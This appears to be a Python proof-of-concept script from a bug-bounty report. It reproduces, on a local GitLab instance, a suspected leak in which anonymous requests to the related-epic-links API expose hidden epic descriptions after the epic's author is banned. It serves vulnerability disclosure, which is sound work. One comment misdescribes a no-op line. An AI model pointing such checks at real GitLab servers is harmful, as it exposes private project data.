#!/usr/bin/env python3
"""End-to-end *HTTP* reproduction on a disposable GitLab 19.4.1-ee instance.

Never synthesizes a related link in DB or stubs application authorization.
Requires a GitLab Ultimate license to exercise the linked-epics endpoint.
All data is local; token values are omitted from evidence.
"""
import datetime
import json
import os
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("GITLAB_URL", "http://127.0.0.1:8929").rstrip("/")
EVIDENCE = os.environ.get("EVIDENCE_DIR", "evidence")
TOKENS = os.environ.get("TOKEN_DIR", ".")
os.makedirs(EVIDENCE, exist_ok=True)
records = []
errors = []
marker = "H1LIVE-" + secrets.token_hex(6)

def token(label):
    with open(os.path.join(TOKENS, label + ".pat"), encoding="utf-8") as fh:
        return fh.read().strip().splitlines()[-1]

def record_http(method, path, role="anonymous", payload=None):
    url = BASE + "/api/v4" + path
    body = urllib.parse.urlencode(payload).encode() if payload is not None else None
    headers = {"Accept": "application/json", "User-Agent": "GitLab-Bounty-Local-HTTP-Repro/1"}
    if body is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    if role != "anonymous":
        headers["PRIVATE-TOKEN"] = token(role)
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            status, raw = resp.status, resp.read(100000)
    except urllib.error.HTTPError as exc:
        status, raw = exc.code, exc.read(100000)
    except Exception as exc:
        status, raw = 0, repr(exc).encode()
    message = raw.decode("utf-8", "replace")
    try:
        decoded = json.loads(message)
    except ValueError:
        decoded = message
    item = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "request": {
            "method": method,
            "url": url,
            "auth": role + (" (PRIVATE-TOKEN: [REDACTED])" if role != "anonymous" else " (no token)"),
            "form": payload,
        },
        "response": {"status": status, "body": decoded},
    }
    records.append(item)
    print(method, path, role, "->", status, flush=True)
    return status, decoded

def must(response, allowed, label):
    status, obj = response
    if status not in allowed:
        raise RuntimeError(f"{label}: HTTP {status}: {str(obj)[:350]}")
    return obj

def persist():
    with open(os.path.join(EVIDENCE, "http-transcript.json"), "w", encoding="utf-8") as fh:
        json.dump(records, fh, indent=2, ensure_ascii=False)
    with open(os.path.join(EVIDENCE, "summary.json"), "w", encoding="utf-8") as fh:
        json.dump({"marker": marker, "errors": errors, "steps": len(records),
                   "live_http": True, "database_link_insertion": False,
                   "licensing_stubs": False}, fh, indent=2)

try:
    version = must(record_http("GET", "/version", "root"), [200], "instance version")
    print("Instance version:", version, flush=True)
    with open(os.path.join(EVIDENCE, "version.json"), "w") as fh:
        json.dump(version, fh, indent=2)

    for who in ("owner", "author"):
        result = must(record_http("POST", "/users", "root", {
            "name": "H1 Test " + who,
            "username": who + marker.lower().replace("-", ""),
            "email": who + "+" + marker.lower() + "@example.invalid",
            "password": secrets.token_urlsafe(28) + "Aa1!",
            "skip_confirmation": "true",
        }), [201], "create " + who + " user")
        with open(os.path.join(TOKENS, who + ".uid"), "w") as fh:
            fh.write(str(result["id"]))
        # Tokens are provisioned via an actual GitLab Rails runner command
        # in the workflow, without exposing token values in artifact/logs.
        os.system("true")

    # A GitLab Rails runner prepares the owner/author tokens in the prior
    # shell orchestration step. They must exist before hitting the REST API.
    for who in ("owner", "author"):
        if not os.path.exists(os.path.join(TOKENS, who + ".pat")):
            raise RuntimeError("Missing " + who + ".pat; provision account token before continuing")

    group = must(record_http("POST", "/groups", "owner", {
        "name": "H1 Repro " + marker, "path": "h1-" + marker.lower(),
        "visibility": "public",
    }), [201], "create public group")
    gid = group["id"]
    authorid = int(open(os.path.join(TOKENS, "author.uid")).read().strip())
    must(record_http("POST", f"/groups/{gid}/members", "owner", {
        "user_id": authorid, "access_level": 40,
    }), [201], "add author as group member")

    source = must(record_http("POST", f"/groups/{gid}/epics", "owner", {
        "title": marker + "-VISIBLE-SOURCE", "description": "Visible test epic",
    }), [201], "create source epic")
    target1 = must(record_http("POST", f"/groups/{gid}/epics", "author", {
        "title": marker + "-HIDDEN-TARGET-ONE",
        "description": marker + "-SECRET-DESCRIPTION-ONE",
    }), [201], "create first target epic")
    target2 = must(record_http("POST", f"/groups/{gid}/epics", "author", {
        "title": marker + "-HIDDEN-TARGET-TWO",
        "description": marker + "-SECRET-DESCRIPTION-TWO",
    }), [201], "create second target epic")

    with open(os.path.join(EVIDENCE, "identifiers.json"), "w") as fh:
        json.dump({"group_id": gid, "source_iid": source["iid"],
                   "target_one_id": target1["id"], "target_one_iid": target1["iid"],
                   "target_two_iid": target2["iid"], "author_id": authorid}, fh, indent=2)

    def relate(target):
        return record_http("POST", f"/groups/{gid}/epics/{source['iid']}/related_epics",
                           "owner", {"target_group_id": gid,
                                     "target_epic_iid": target["iid"],
                                     "link_type": "relates_to"})

    # First make the relationship while both authors are still active.
    must(relate(target1), [201, 200], "link first target BEFORE ban")
    before = must(record_http("GET", f"/groups/{gid}/related_epic_links"),
                  [200], "anonymous listing before ban")
    must(record_http("POST", f"/users/{authorid}/ban", "root"),
         [201, 200], "admin bans target author")
    after = must(record_http("GET", f"/groups/{gid}/related_epic_links"),
                 [200], "anonymous listing after ban")
    attempt = relate(target2)
    print("POST-BAN linking result:", attempt[0], flush=True)
    leaked = marker + "-SECRET-DESCRIPTION-ONE" in json.dumps(after)
    print("ANONYMOUS_HIDDEN_DATA_DISCLOSURE:", leaked, flush=True)
    print("PRE_BAN_ANON_VISIBLE:", marker + "-SECRET-DESCRIPTION-ONE" in json.dumps(before), flush=True)
    print("POST_BAN_NEW_LINK_STATUS:", attempt[0], flush=True)
    if not leaked:
        raise RuntimeError("No hidden Epic description leaked through anonymous HTTP GET")
except Exception as exc:
    errors.append(str(exc))
    print("NOT VERIFIED:", exc, file=sys.stderr, flush=True)
finally:
    persist()

sys.exit(1 if errors else 0)
